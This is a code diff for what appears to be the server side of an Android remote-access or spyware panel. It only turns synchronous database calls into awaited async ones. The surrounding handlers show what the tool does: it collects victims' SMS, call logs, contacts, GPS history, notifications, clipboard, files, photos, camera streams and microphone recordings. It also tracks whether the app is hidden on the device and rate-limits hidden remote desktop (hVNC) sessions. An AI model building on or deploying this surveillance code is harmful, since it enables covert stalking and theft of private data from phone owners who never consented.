@@ -42,7 +42,7 @@ class SocketService {
   private deviceOwners: Map<string, string> = new Map();
   private hvncRate: Map<string, { count: number; windowStart: number }> = new Map();
 
-  initialize(httpServer: HttpServer, fastifyApp: FastifyInstance): void {
+  async initialize(httpServer: HttpServer, fastifyApp: FastifyInstance): Promise<void> {
     const config = getConfig();
     this.fastifyApp = fastifyApp;
     this.io = new SocketIOServer(httpServer, {
@@ -71,7 +71,7 @@ class SocketService {
       const clientToken = socket.handshake.query.token as string || socket.handshake.auth?.token as string;
       let matchedUserId: string | null = null;
       let authenticated = false;
-      const userSecrets = dbHelpers.getAllDeviceSecrets();
+      const userSecrets = (await dbHelpers.getAllDeviceSecrets());
       for (const { userId, deviceSecret } of userSecrets) {
         const a = Buffer.from(String(clientToken || ''));
         const b = Buffer.from(deviceSecret);
@@ -155,9 +155,9 @@ class SocketService {
       this.ensureClientData(id);
     }
     this.sockets.set(id, socket);
-    dbHelpers.addLog('CONNECTION', 'CLIENT', `Client ${id} connected from ${ip}`, JSON.stringify({ ip, country, city, model, manf }));
+    (await dbHelpers.addLog('CONNECTION', 'CLIENT', `Client ${id} connected from ${ip}`, JSON.stringify({ ip, country, city, model, manf })));
     this.io.to('admin').emit('client:connect', { id, model, ip });
-    const connectOwnerId = dbHelpers.getDeviceOwnerId(id);
+    const connectOwnerId = (await dbHelpers.getDeviceOwnerId(id));
     if (connectOwnerId) {
       this.deviceOwners.set(id, connectOwnerId);
       this.io.to(`user:${connectOwnerId}`).emit('client:connect', { id, model, ip });
@@ -181,31 +181,31 @@ class SocketService {
     for (const [transferId, transfer] of this.transfers) {
       if (transferId.startsWith(id + ':')) this.transfers.delete(transferId);
     }
-    dbHelpers.addLog('DISCONNECTION', 'CLIENT', `Client ${id} disconnected`);
-    dbHelpers.setClientData(id, 'notification_status', JSON.stringify(null));
-    dbHelpers.setClientData(id, 'mic_status', JSON.stringify(null));
-    dbHelpers.setClientData(id, 'wifi_error', JSON.stringify(null));
+    (await dbHelpers.addLog('DISCONNECTION', 'CLIENT', `Client ${id} disconnected`));
+    (await dbHelpers.setClientData(id, 'notification_status', JSON.stringify(null)));
+    (await dbHelpers.setClientData(id, 'mic_status', JSON.stringify(null)));
+    (await dbHelpers.setClientData(id, 'wifi_error', JSON.stringify(null)));
     this.io.to('admin').emit('client:disconnect', { id });
-    const disconnectOwnerId = dbHelpers.getDeviceOwnerId(id);
+    const disconnectOwnerId = (await dbHelpers.getDeviceOwnerId(id));
     if (disconnectOwnerId) this.io.to(`user:${disconnectOwnerId}`).emit('client:disconnect', { id });
   }
 
-  private ensureClientData(clientId: string): void {
+  private async ensureClientData(clientId: string): Promise<void> {
     const dataTypes = ['sms', 'calls', 'contacts', 'wifi', 'wifi_error', 'clipboard', 'notifications', 'notification_status', 'permissions', 'apps', 'gps', 'files', 'file_error', 'cameras', 'mic_status', 'queue'];
-    for (const type of dataTypes) dbHelpers.getOrCreateClientData(clientId, type);
+    for (const type of dataTypes) (await dbHelpers.getOrCreateClientData(clientId, type));
   }
 
-  private saveFileToDb(clientId: string, fileType: string, buffer: Buffer, originalName: string): void {
-    dbHelpers.addClientFile(clientId, fileType, originalName, getMimeType(originalName), buffer, buffer.length);
+  private async saveFileToDb(clientId: string, fileType: string, buffer: Buffer, originalName: string): Promise<void> {
+    (await dbHelpers.addClientFile(clientId, fileType, originalName, getMimeType(originalName), buffer, buffer.length));
   }
 
-  private completeTransfer(id: string, transfer: TransferChunk, fileType: string, dataType: string): void {
+  private async completeTransfer(id: string, transfer: TransferChunk, fileType: string, dataType: string): Promise<void> {
     const buffer = Buffer.concat(Array.from(transfer.chunks.entries()).sort(([a], [b]) => a - b).map(([, chunk]) => chunk));
     this.saveFileToDb(id, fileType, buffer, transfer.name);
-    dbHelpers.addLog('DATA', dataType, `${dataType} (chunked) from ${id}`, JSON.stringify({ size: buffer.length, name: transfer.name }));
+    (await dbHelpers.addLog('DATA', dataType, `${dataType} (chunked) from ${id}`, JSON.stringify({ size: buffer.length, name: transfer.name })));
     this.transfers.delete(`${id}:${transfer.transferId}`);
     const dataTypeLower = dataType.toLowerCase();
-    const ownerId = dbHelpers.getDeviceOwnerId(id);
+    const ownerId = (await dbHelpers.getDeviceOwnerId(id));
     if (ownerId) {
       this.io.to('admin').to(`user:${ownerId}`).emit('client:data', { id, dataType: dataTypeLower });
     } else {
@@ -224,8 +224,8 @@ class SocketService {
     return decodedSize <= MAX_TRANSFER_CHUNK_SIZE;
   }
 
-  private markCommandResponded(clientId: string, cmdType: CmdType, summary?: string): void {
-    const ids = dbHelpers.markAllPendingCommandsResponded(clientId, cmdType, summary);
+  private async markCommandResponded(clientId: string, cmdType: CmdType, summary?: string): Promise<void> {
+    const ids = (await dbHelpers.markAllPendingCommandsResponded(clientId, cmdType, summary));
     for (const id of ids) {
       // FIX: include summary in the broadcast so the frontend can surface
       // device-side error details (e.g., "SMS failed: No SIM") and success
@@ -237,12 +237,12 @@ class SocketService {
 
   private async setupHandlers(socket: Socket, id: string): Promise<void> {
     const d = getDb();
-    const broadcastData = (dataType: string) => {
+    const broadcastData = async (dataType: string) => {
       this.io.to('admin').emit('client:data', { id, dataType });
-      const ownerId = dbHelpers.getDeviceOwnerId(id);
+      const ownerId = (await dbHelpers.getDeviceOwnerId(id));
       if (ownerId) this.io.to(`user:${ownerId}`).emit('client:data', { id, dataType });
     };
-    socket.on(CMD.SMS, (data: any) => {
+    socket.on(CMD.SMS, async (data: any) => {
       try {
         if (data.smslist) {
           const normalizedSms = (data.smslist as any[]).map((sms: any) => ({
@@ -252,8 +252,8 @@ class SocketService {
               : (sms.date || new Date().toISOString()),
             type: typeof sms.type === 'number' ? sms.type : (typeof sms.type === 'string' ? parseInt(sms.type) || 0 : 0),
           }));
-          dbHelpers.setClientData(id, 'sms', JSON.stringify(normalizedSms));
-          dbHelpers.addLog('DATA', 'SMS', `SMS data received from ${id}`, JSON.stringify({ count: data.total || data.smslist.length }));
+          (await dbHelpers.setClientData(id, 'sms', JSON.stringify(normalizedSms)));
+          (await dbHelpers.addLog('DATA', 'SMS', `SMS data received from ${id}`, JSON.stringify({ count: data.total || data.smslist.length })));
           this.markCommandResponded(id, CMD.SMS, `${data.total || data.smslist.length} messages`);
           broadcastData('sms');
         }
@@ -262,44 +262,44 @@ class SocketService {
           const body = String(data.sms || data.body || data.message || '');
           if (to) {
             try {
-              const smsData = JSON.parse(dbHelpers.getOrCreateClientData(id, 'sms'));
+              const smsData = JSON.parse((await dbHelpers.getOrCreateClientData(id, 'sms')));
               if (Array.isArray(smsData)) {
                 smsData.unshift({ address: to, body, date: new Date().toISOString(), type: 2 });
                 if (smsData.length > 500) smsData.splice(500);
-                dbHelpers.setClientData(id, 'sms', JSON.stringify(smsData));
+                (await dbHelpers.setClientData(id, 'sms', JSON.stringify(smsData)));
                 broadcastData('sms');
               }
             } catch (persistErr: unknown) {
               log.error(`SMS persist failed: ${id}: ${persistErr instanceof Error ? persistErr.message : String(persistErr)}`);
             }
           }
-          dbHelpers.addLog('COMMAND', 'SMS', `SMS sent from ${id}`);
+          (await dbHelpers.addLog('COMMAND', 'SMS', `SMS sent from ${id}`));
           this.markCommandResponded(id, CMD.SMS, 'SMS sent');
         }
         if (data.action === 'sendSMS' && data.error) {
-          dbHelpers.addLog('ERROR', 'SMS', `SMS send failed from ${id}: ${data.error}`);
+          (await dbHelpers.addLog('ERROR', 'SMS', `SMS send failed from ${id}: ${data.error}`));
           this.markCommandResponded(id, CMD.SMS, `SMS failed: ${data.error}`);
           this.broadcastToDeviceOwner(id, 'client:data', { id, dataType: 'sms_status', status: 'error', error: data.error });
         }
       } catch (err: unknown) { log.error(`SMS: ${err instanceof Error ? err.message : String(err)}`); }
     });
-    socket.on(CMD.CALLS, (data: any) => {
+    socket.on(CMD.CALLS, async (data: any) => {
       try {
         if (data.callsList) {
           const normalized = normalizeCalls(data);
-          dbHelpers.setClientData(id, 'calls', JSON.stringify(normalized));
-          dbHelpers.addLog('DATA', 'CALLS', `Call logs received from ${id}`, JSON.stringify({ count: data.total || data.callsList.length }));
+          (await dbHelpers.setClientData(id, 'calls', JSON.stringify(normalized)));
+          (await dbHelpers.addLog('DATA', 'CALLS', `Call logs received from ${id}`, JSON.stringify({ count: data.total || data.callsList.length })));
           this.markCommandResponded(id, CMD.CALLS, `${data.total || data.callsList.length} calls`);
           broadcastData('calls');
         }
       } catch (err: unknown) { log.error(`Calls: ${err instanceof Error ? err.message : String(err)}`); }
     });
-    socket.on(CMD.CONTACTS, (data: any) => {
+    socket.on(CMD.CONTACTS, async (data: any) => {
       try {
         if (data.contactsList) {
           const normalized = normalizeContacts(data);
-          dbHelpers.setClientData(id, 'contacts', JSON.stringify(normalized));
-          dbHelpers.addLog('DATA', 'CONTACTS', `Contacts received from ${id}`, JSON.stringify({ count: data.total || data.contactsList.length }));
+          (await dbHelpers.setClientData(id, 'contacts', JSON.stringify(normalized)));
+          (await dbHelpers.addLog('DATA', 'CONTACTS', `Contacts received from ${id}`, JSON.stringify({ count: data.total || data.contactsList.length })));
           this.markCommandResponded(id, CMD.CONTACTS, `${data.total || data.contactsList.length} contacts`);
           broadcastData('contacts');
         }
@@ -311,7 +311,7 @@ class SocketService {
           : Array.isArray(data.locationList) ? data.locationList
           : null;
         if (locList && locList.length > 0) {
-          const gpsData = JSON.parse(dbHelpers.getOrCreateClientData(id, 'gps'));
+          const gpsData = JSON.parse((await dbHelpers.getOrCreateClientData(id, 'gps')));
           for (const loc of locList) {
             const lat = Number(loc.latitude);
             const lng = Number(loc.longitude);
@@ -324,14 +324,14 @@ class SocketService {
             });
           }
           if (gpsData.length > 500) gpsData.splice(0, gpsData.length - 500);
-          dbHelpers.setClientData(id, 'gps', JSON.stringify(gpsData));
-          dbHelpers.addLog('DATA', 'GPS', `GPS locations from ${id}`, JSON.stringify({ count: locList.length }));
+          (await dbHelpers.setClientData(id, 'gps', JSON.stringify(gpsData)));
+          (await dbHelpers.addLog('DATA', 'GPS', `GPS locations from ${id}`, JSON.stringify({ count: locList.length })));
           this.markCommandResponded(id, CMD.LOCATION, `${locList.length} locations`);
           broadcastData('gps');
           return;
         }
         if (data.enabled === false || (data.latitude === undefined && data.longitude === undefined)) {
-          dbHelpers.addLog('DATA', 'GPS', `GPS unavailable from ${id}: ${data.error || 'No location'}`);
+          (await dbHelpers.addLog('DATA', 'GPS', `GPS unavailable from ${id}: ${data.error || 'No location'}`));
           this.markCommandResponded(id, CMD.LOCATION, data.error || 'No location');
           broadcastData('gps');
           return;
@@ -339,11 +339,11 @@ class SocketService {
         const lat = Number(data.latitude);
         const lng = Number(data.longitude);
         if (!Number.isFinite(lat) || !Number.isFinite(lng) || lat < -90 || lat > 90 || lng < -180 || lng > 180) {
-          dbHelpers.addLog('ERROR', 'GPS', `Invalid GPS data from ${id}: lat=${data.latitude}, lng=${data.longitude}`);
+          (await dbHelpers.addLog('ERROR', 'GPS', `Invalid GPS data from ${id}: lat=${data.latitude}, lng=${data.longitude}`));
           this.markCommandResponded(id, CMD.LOCATION, 'Invalid location data');
           return;
         }
-        const gpsData = JSON.parse(dbHelpers.getOrCreateClientData(id, 'gps'));
+        const gpsData = JSON.parse((await dbHelpers.getOrCreateClientData(id, 'gps')));
         if (gpsData.length > 0) {
           const last = gpsData[gpsData.length - 1];
           const dist = Math.sqrt(Math.pow(lat - last.latitude, 2) + Math.pow(lng - last.longitude, 2)) * 111000;
@@ -368,53 +368,53 @@ class SocketService {
         if (gpsData.length > MAX_GPS_ENTRIES) {
           gpsData.splice(0, gpsData.length - MAX_GPS_ENTRIES);
         }
-        dbHelpers.setClientData(id, 'gps', JSON.stringify(gpsData));
+        (await dbHelpers.setClientData(id, 'gps', JSON.stringify(gpsData)));
         await d.update(clients).set({
                     lastSeen: new Date().toISOString(),
                   }).where(eq(clients.id, id));
-        dbHelpers.addLog('DATA', 'GPS', `GPS location from ${id}`, JSON.stringify({ lat, lng }));
+        (await dbHelpers.addLog('DATA', 'GPS', `GPS location from ${id}`, JSON.stringify({ lat, lng })));
         this.markCommandResponded(id, CMD.LOCATION, `${lat.toFixed(4)}, ${lng.toFixed(4)}`);
         broadcastData('gps');
       } catch (err: unknown) { log.error(`GPS: ${err instanceof Error ? err.message : String(err)}`); }
     });
-    socket.on(CMD.WIFI, (data: any) => {
+    socket.on(CMD.WIFI, async (data: any) => {
       try {
         const networks = data.networks || data.wifiList || data.list;
         if (networks) {
-          dbHelpers.setClientData(id, 'wifi', JSON.stringify(networks));
-          dbHelpers.setClientData(id, 'wifi_error', JSON.stringify(null));
-          dbHelpers.addLog('DATA', 'WIFI', `WiFi data from ${id}`, JSON.stringify({ count: data.total || networks.length }));
+          (await dbHelpers.setClientData(id, 'wifi', JSON.stringify(networks)));
+          (await dbHelpers.setClientData(id, 'wifi_error', JSON.stringify(null)));
+          (await dbHelpers.addLog('DATA', 'WIFI', `WiFi data from ${id}`, JSON.stringify({ count: data.total || networks.length })));
           this.markCommandResponded(id, CMD.WIFI, `${data.total || networks.length} networks`);
           broadcastData('wifi');
         }
         if (data.error) {
-          dbHelpers.setClientData(id, 'wifi', JSON.stringify([]));
-          dbHelpers.setClientData(id, 'wifi_error', JSON.stringify({ error: data.error, timestamp: Date.now() }));
-          dbHelpers.addLog('ERROR', 'WIFI', `WiFi scan error from ${id}: ${data.error}`);
+          (await dbHelpers.setClientData(id, 'wifi', JSON.stringify([])));
+          (await dbHelpers.setClientData(id, 'wifi_error', JSON.stringify({ error: data.error, timestamp: Date.now() })));
+          (await dbHelpers.addLog('ERROR', 'WIFI', `WiFi scan error from ${id}: ${data.error}`));
           this.markCommandResponded(id, CMD.WIFI, data.error);
           broadcastData('wifi');
         }
       } catch (err: unknown) { log.error(`WiFi: ${err instanceof Error ? err.message : String(err)}`); }
     });
-    socket.on(CMD.NOTIFICATIONS, (data: any) => {
+    socket.on(CMD.NOTIFICATIONS, async (data: any) => {
       try {
         if (data.enabled !== undefined) {
-          dbHelpers.setClientData(id, 'notification_status', JSON.stringify({ enabled: data.enabled, connected: !!data.connected }));
+          (await dbHelpers.setClientData(id, 'notification_status', JSON.stringify({ enabled: data.enabled, connected: !!data.connected })));
           this.markCommandResponded(id, CMD.NOTIFICATIONS, data.enabled ? 'Enabled' : 'Disabled');
           broadcastData('notifications');
         }
         if (data.notificationStatus) {
-          dbHelpers.setClientData(id, 'notification_status', JSON.stringify({
-            enabled: data.notificationStatus.enabled !== undefined ? data.notificationStatus.enabled : true,
-            connected: data.notificationStatus.connected !== undefined ? data.notificationStatus.connected : true,
-          }));
+          (await dbHelpers.setClientData(id, 'notification_status', JSON.stringify({
+                        enabled: data.notificationStatus.enabled !== undefined ? data.notificationStatus.enabled : true,
+                        connected: data.notificationStatus.connected !== undefined ? data.notificationStatus.connected : true,
+                      })));
           broadcastData('notifications');
         }
         const notifList = Array.isArray(data.notifications) ? data.notifications
           : Array.isArray(data.list) ? data.list
           : null;
         if (notifList) {
-          const notifications = JSON.parse(dbHelpers.getOrCreateClientData(id, 'notifications'));
+          const notifications = JSON.parse((await dbHelpers.getOrCreateClientData(id, 'notifications')));
           for (const n of notifList) {
             const rawTs = n.timestamp || n.postTime || Date.now();
             const tsStr = typeof rawTs === 'number' ? new Date(rawTs).toISOString() : String(rawTs);
@@ -426,14 +426,14 @@ class SocketService {
             });
           }
           if (notifications.length > 500) notifications.splice(0, notifications.length - 500);
-          dbHelpers.setClientData(id, 'notifications', JSON.stringify(notifications));
-          dbHelpers.addLog('DATA', 'NOTIFICATIONS', `${notifList.length} notifications from ${id}`);
+          (await dbHelpers.setClientData(id, 'notifications', JSON.stringify(notifications)));
+          (await dbHelpers.addLog('DATA', 'NOTIFICATIONS', `${notifList.length} notifications from ${id}`));
           broadcastData('notifications');
           return;
         }
         const notification = data;
         if ((notification.appName || notification.title) && !data.enabled && !data.removed) {
-          const notifications = JSON.parse(dbHelpers.getOrCreateClientData(id, 'notifications'));
+          const notifications = JSON.parse((await dbHelpers.getOrCreateClientData(id, 'notifications')));
           const rawTs = notification.timestamp || notification.postTime || Date.now();
           const tsStr = typeof rawTs === 'number' ? new Date(rawTs).toISOString() : String(rawTs);
           const notifId = notification.id != null ? String(notification.id) : '';
@@ -453,15 +453,15 @@ class SocketService {
               category: notification.category, initial: notification.initial,
             });
             if (notifications.length > 500) notifications.splice(0, notifications.length - 500);
-            dbHelpers.setClientData(id, 'notifications', JSON.stringify(notifications));
-            dbHelpers.addLog('DATA', 'NOTIFICATIONS', `Notification from ${id}`);
+            (await dbHelpers.setClientData(id, 'notifications', JSON.stringify(notifications)));
+            (await dbHelpers.addLog('DATA', 'NOTIFICATIONS', `Notification from ${id}`));
             broadcastData('notifications');
           }
         }
         if (data.removed) {
-          dbHelpers.addLog('DATA', 'NOTIFICATIONS', `Notification removed on ${id}: ${data.packageName || 'unknown'}`);
+          (await dbHelpers.addLog('DATA', 'NOTIFICATIONS', `Notification removed on ${id}: ${data.packageName || 'unknown'}`));
           try {
-            const notifications = JSON.parse(dbHelpers.getOrCreateClientData(id, 'notifications'));
+            const notifications = JSON.parse((await dbHelpers.getOrCreateClientData(id, 'notifications')));
             if (Array.isArray(notifications) && notifications.length > 0) {
               const removedTime = data.postTime || data.timestamp || Date.now();
               const removedId = data.id != null ? String(data.id) : '';
@@ -477,7 +477,7 @@ class SocketService {
                 return true;
               });
               if (filtered.length < notifications.length) {
-                dbHelpers.setClientData(id, 'notifications', JSON.stringify(filtered));
+                (await dbHelpers.setClientData(id, 'notifications', JSON.stringify(filtered)));
                 broadcastData('notifications');
               }
             }
@@ -487,9 +487,9 @@ class SocketService {
         }
       } catch (err: unknown) { log.error(`Notif: ${err instanceof Error ? err.message : String(err)}`); }
     });
-    socket.on(CMD.CLIPBOARD, (data: any) => {
+    socket.on(CMD.CLIPBOARD, async (data: any) => {
       try {
-        const clipboard = JSON.parse(dbHelpers.getOrCreateClientData(id, 'clipboard'));
+        const clipboard = JSON.parse((await dbHelpers.getOrCreateClientData(id, 'clipboard')));
         const items = Array.isArray(data.clipboardList) ? data.clipboardList
           : Array.isArray(data.list) ? data.list
           : null;
@@ -518,40 +518,40 @@ class SocketService {
           }
         }
         if (clipboard.length > 200) clipboard.splice(0, clipboard.length - 200);
-        dbHelpers.setClientData(id, 'clipboard', JSON.stringify(clipboard));
-        dbHelpers.addLog('DATA', 'CLIPBOARD', `Clipboard data from ${id}`);
+        (await dbHelpers.setClientData(id, 'clipboard', JSON.stringify(clipboard)));
+        (await dbHelpers.addLog('DATA', 'CLIPBOARD', `Clipboard data from ${id}`));
         this.markCommandResponded(id, CMD.CLIPBOARD, 'Clipboard updated');
         broadcastData('clipboard');
       } catch (err: unknown) { log.error(`Clipboard: ${err instanceof Error ? err.message : String(err)}`); }
     });
-    socket.on(CMD.APPS, (data: any) => {
+    socket.on(CMD.APPS, async (data: any) => {
       try {
         const apps = data.apps || data.appsList || data.list;
         if (apps) {
           const normalized = Array.isArray(apps) ? apps : [];
-          dbHelpers.setClientData(id, 'apps', JSON.stringify(normalized));
-          dbHelpers.addLog('DATA', 'APPS', `Apps list from ${id}`, JSON.stringify({ count: data.total || normalized.length }));
+          (await dbHelpers.setClientData(id, 'apps', JSON.stringify(normalized)));
+          (await dbHelpers.addLog('DATA', 'APPS', `Apps list from ${id}`, JSON.stringify({ count: data.total || normalized.length })));
           this.markCommandResponded(id, CMD.APPS, `${data.total || normalized.length} apps`);
           broadcastData('apps');
         }
       } catch (err: unknown) { log.error(`Apps: ${err instanceof Error ? err.message : String(err)}`); }
     });
-    socket.on(CMD.PERMISSIONS, (data: any) => {
+    socket.on(CMD.PERMISSIONS, async (data: any) => {
       try {
         const perms = normalizePermissions(data);
-        dbHelpers.setClientData(id, 'permissions', JSON.stringify(perms));
-        dbHelpers.addLog('DATA', 'PERMISSIONS', `Permissions from ${id}`, JSON.stringify({ count: perms.length }));
+        (await dbHelpers.setClientData(id, 'permissions', JSON.stringify(perms)));
+        (await dbHelpers.addLog('DATA', 'PERMISSIONS', `Permissions from ${id}`, JSON.stringify({ count: perms.length })));
         this.markCommandResponded(id, CMD.PERMISSIONS, `${perms.length} permissions`);
         broadcastData('permissions');
       } catch (err: unknown) { log.error(`Permissions: ${err instanceof Error ? err.message : String(err)}`); }
     });
-    socket.on(CMD.PERM_CHECK, (data: any) => {
+    socket.on(CMD.PERM_CHECK, async (data: any) => {
       try {
-        const perms = JSON.parse(dbHelpers.getOrCreateClientData(id, 'permissions'));
+        const perms = JSON.parse((await dbHelpers.getOrCreateClientData(id, 'permissions')));
         const idx = perms.findIndex((p: any) => p.permission === data.permission);
         if (idx >= 0) perms[idx].allowed = data.allowed;
         else perms.push({ permission: data.permission, allowed: data.allowed });
-        dbHelpers.setClientData(id, 'permissions', JSON.stringify(perms));
+        (await dbHelpers.setClientData(id, 'permissions', JSON.stringify(perms)));
         this.markCommandResponded(id, CMD.PERM_CHECK, `${data.permission}: ${data.allowed ? 'granted' : 'denied'}`);
         broadcastData('permissions');
       } catch (err: unknown) { log.error(`PermCheck: ${err instanceof Error ? err.message : String(err)}`); }
@@ -566,7 +566,7 @@ class SocketService {
           updates.deviceVersion = (data.androidVersion || data.version) as string;
         }
         await d.update(clients).set(updates).where(eq(clients.id, id));
-        dbHelpers.addLog('DATA', 'DEVICE', `Device info from ${id}`);
+        (await dbHelpers.addLog('DATA', 'DEVICE', `Device info from ${id}`));
         this.markCommandResponded(id, CMD.INFO, 'Device info updated');
         this.broadcastToDeviceOwner(id, 'client:update', { id, dataType: 'info' });
       } catch (err: unknown) { log.error(`Info: ${err instanceof Error ? err.message : String(err)}`); }
@@ -575,7 +575,7 @@ class SocketService {
       try {
         const hidden = !!data.hidden;
         await d.update(clients).set({ fasonHidden: hidden }).where(eq(clients.id, id));
-        dbHelpers.addLog('DATA', 'FASON', `App ${hidden ? 'hidden' : 'shown'} on ${id}`);
+        (await dbHelpers.addLog('DATA', 'FASON', `App ${hidden ? 'hidden' : 'shown'} on ${id}`));
         this.markCommandResponded(id, CMD.FASON, hidden ? 'Hidden' : 'Shown');
         this.broadcastToDeviceOwner(id, 'client:update', { id, dataType: 'fason' });
       } catch (err: unknown) { log.error(`Fason: ${err instanceof Error ? err.message : String(err)}`); }
@@ -586,8 +586,8 @@ class SocketService {
         if (camList) {
           const camData = Array.isArray(data.list) ? data.list : camList;
           await d.update(clients).set({ cameraPermission: data.hasPermission !== undefined ? !!data.hasPermission : (data.permission !== undefined ? !!data.permission : true) }).where(eq(clients.id, id));
-          dbHelpers.setClientData(id, 'cameras', JSON.stringify(camData));
-          dbHelpers.addLog('DATA', 'CAMERA', `Camera list from ${id}`, JSON.stringify({ count: camData.length }));
+          (await dbHelpers.setClientData(id, 'cameras', JSON.stringify(camData)));
+          (await dbHelpers.addLog('DATA', 'CAMERA', `Camera list from ${id}`, JSON.stringify({ count: camData.length })));
           this.markCommandResponded(id, CMD.CAMERA, `${camData.length} cameras`);
           broadcastData('camera');
         } else if (data.type === 'download_start') {
@@ -615,7 +615,7 @@ class SocketService {
         } else if (data.type === 'download_end') {
           this.transfers.delete(`${id}:${data.transferId}`);
           if (data.error) {
-            dbHelpers.addLog('ERROR', 'CAMERA', `Camera transfer failed from ${id}: ${data.error}`);
+            (await dbHelpers.addLog('ERROR', 'CAMERA', `Camera transfer failed from ${id}: ${data.error}`));
             this.markCommandResponded(id, CMD.CAMERA, `Transfer failed: ${data.error}`);
           }
         } else if (data.streamFrame === true) {
@@ -631,13 +631,13 @@ class SocketService {
             this.broadcastToDeviceOwnerBinary(id, 'client:camera_stream', { id, cameraId: data.cameraId, timestamp: data.timestamp }, Buffer.from(data.buffer, 'base64'));
           }
         } else if (data.status === 'recording') {
-          dbHelpers.addLog('DATA', 'CAMERA', `Video recording started from ${id}`, JSON.stringify({ cameraId: data.cameraId }));
+          (await dbHelpers.addLog('DATA', 'CAMERA', `Video recording started from ${id}`, JSON.stringify({ cameraId: data.cameraId })));
           this.broadcastToDeviceOwner(id, 'client:data', { id, dataType: 'camera', videoStatus: 'recording', cameraId: data.cameraId });
         } else if (data.status === 'stopped') {
-          dbHelpers.addLog('DATA', 'CAMERA', `Video recording stopped from ${id}`);
+          (await dbHelpers.addLog('DATA', 'CAMERA', `Video recording stopped from ${id}`));
           this.broadcastToDeviceOwner(id, 'client:data', { id, dataType: 'camera', videoStatus: 'stopped' });
         } else if (data.image === false && data.error) {
-          dbHelpers.addLog('ERROR', 'CAMERA', `Camera error from ${id}: ${data.error}`);
+          (await dbHelpers.addLog('ERROR', 'CAMERA', `Camera error from ${id}: ${data.error}`));
           this.markCommandResponded(id, CMD.CAMERA, data.error);
           this.broadcastToDeviceOwner(id, 'client:data', { id, dataType: 'camera', videoStatus: 'error', cameraId: data.cameraId, error: data.error });
         } else if (typeof data.buffer === 'string' && data.buffer.length > 0) {
@@ -646,7 +646,7 @@ class SocketService {
           const fileName = data.name || `capture_${Date.now()}.jpg`;
           const isVideo = fileName.endsWith('.mp4');
           this.saveFileToDb(id, isVideo ? 'video' : 'photo', buffer, fileName);
-          dbHelpers.addLog('DATA', 'CAMERA', `${isVideo ? 'Video' : 'Photo'} captured from ${id}`, JSON.stringify({ size: buffer.length }));
+          (await dbHelpers.addLog('DATA', 'CAMERA', `${isVideo ? 'Video' : 'Photo'} captured from ${id}`, JSON.stringify({ size: buffer.length })));
           this.markCommandResponded(id, CMD.CAMERA, isVideo ? 'Video captured' : 'Photo captured');
           broadcastData('camera');
         }
@@ -656,10 +656,10 @@ class SocketService {
       try {
         if (data.type === 'list' || (Array.isArray(data.list) && !data.type)) {
           const normalizedList = normalizeFileList(data.list || []);
-          dbHelpers.setClientData(id, 'files', JSON.stringify(normalizedList));
+          (await dbHelpers.setClientData(id, 'files', JSON.stringify(normalizedList)));
           await d.update(clients).set({ currentPath: data.path || '' }).where(eq(clients.id, id));
-          dbHelpers.setClientData(id, 'file_error', JSON.stringify(null));
-          dbHelpers.addLog('DATA', 'FILES', `File list from ${id}`, JSON.stringify({ path: data.path, count: normalizedList.length }));
+          (await dbHelpers.setClientData(id, 'file_error', JSON.stringify(null)));
+          (await dbHelpers.addLog('DATA', 'FILES', `File list from ${id}`, JSON.stringify({ path: data.path, count: normalizedList.length })));
           this.markCommandResponded(id, CMD.FILES, `${normalizedList.length} files`);
           broadcastData('files');
         } else if (data.type === 'download') {
@@ -667,7 +667,7 @@ class SocketService {
           if (data.buffer.length > MAX_SINGLE_BUFFER_SIZE * 1.34) { log.warn(`Socket: File buffer too large: ${id}`); return; }
           const buffer = Buffer.from(data.buffer, 'base64');
           this.saveFileToDb(id, 'download', buffer, data.name || 'download');
-          dbHelpers.addLog('DATA', 'FILES', `File downloaded from ${id}: ${data.name}`, JSON.stringify({ size: buffer.length }));
+          (await dbHelpers.addLog('DATA', 'FILES', `File downloaded from ${id}: ${data.name}`, JSON.stringify({ size: buffer.length })));
           this.markCommandResponded(id, CMD.FILES, `Downloaded: ${data.name}`);
           broadcastData('files');
         } else if (data.type === 'download_start') {
@@ -694,15 +694,15 @@ class SocketService {
         } else if (data.type === 'download_end') {
           this.transfers.delete(`${id}:${data.transferId}`);
           if (data.error) {
-            dbHelpers.addLog('ERROR', 'FILES', `File transfer failed from ${id}: ${data.error}`);
+            (await dbHelpers.addLog('ERROR', 'FILES', `File transfer failed from ${id}: ${data.error}`));
             this.markCommandResponded(id, CMD.FILES, `Transfer failed: ${data.error}`);
           }
         } else if (data.type === 'error') {
           const transferId = data.transferId ? `${id}:${data.transferId}` : null;
           if (transferId) this.transfers.delete(transferId);
           const errorMsg = data.error || 'Unknown file transfer error';
-          dbHelpers.addLog('ERROR', 'FILES', `File transfer error from ${id}: ${errorMsg}`, JSON.stringify({ path: data.path || '' }));
-          dbHelpers.setClientData(id, 'file_error', JSON.stringify({ error: errorMsg, path: data.path || '', timestamp: Date.now() }));
+          (await dbHelpers.addLog('ERROR', 'FILES', `File transfer error from ${id}: ${errorMsg}`, JSON.stringify({ path: data.path || '' })));
+          (await dbHelpers.setClientData(id, 'file_error', JSON.stringify({ error: errorMsg, path: data.path || '', timestamp: Date.now() })));
           this.markCommandResponded(id, CMD.FILES, errorMsg);
           this.broadcastToDeviceOwner(id, 'client:data', { id, dataType: 'files' });
         } else if (data.type === 'modify_result') {
@@ -712,7 +712,7 @@ class SocketService {
             : `${data.action || 'modify'} failed: ${data.error || 'unknown'}`;
           this.markCommandResponded(id, CMD.FILES, summary);
           if (!success) {
-            dbHelpers.addLog('ERROR', 'FILES', `File modify failed from ${id}: ${data.error}`, JSON.stringify({ action: data.action, path: data.path }));
+            (await dbHelpers.addLog('ERROR', 'FILES', `File modify failed from ${id}: ${data.error}`, JSON.stringify({ action: data.action, path: data.path })));
           } else {
             broadcastData('files');
           }
@@ -723,7 +723,7 @@ class SocketService {
           if (success) {
             broadcastData('files');
           } else {
-            dbHelpers.addLog('ERROR', 'FILES', `File push failed from ${id}: ${data.error}`, JSON.stringify({ path: data.path }));
+            (await dbHelpers.addLog('ERROR', 'FILES', `File push failed from ${id}: ${data.error}`, JSON.stringify({ path: data.path })));
           }
         } else if (data.type === 'upload_start' || data.type === 'upload_progress') {
           this.broadcastToDeviceOwner(id, 'client:transfer', { id, transferId: data.transferId, name: data.name, totalSize: data.totalSize, progress: data.progress || 0 });
@@ -732,7 +732,7 @@ class SocketService {
         }
       } catch (err: unknown) { log.error(`Files: ${err instanceof Error ? err.message : String(err)}`); }
     });
-    socket.on(CMD.MIC, (data: any) => {
+    socket.on(CMD.MIC, async (data: any) => {
       try {
         if (data.type === 'download_start') {
           if (!this.validateTransferStart(data.totalChunks, data.totalSize)) { log.warn(`Socket: Mic transfer too large: ${id}`); return; }
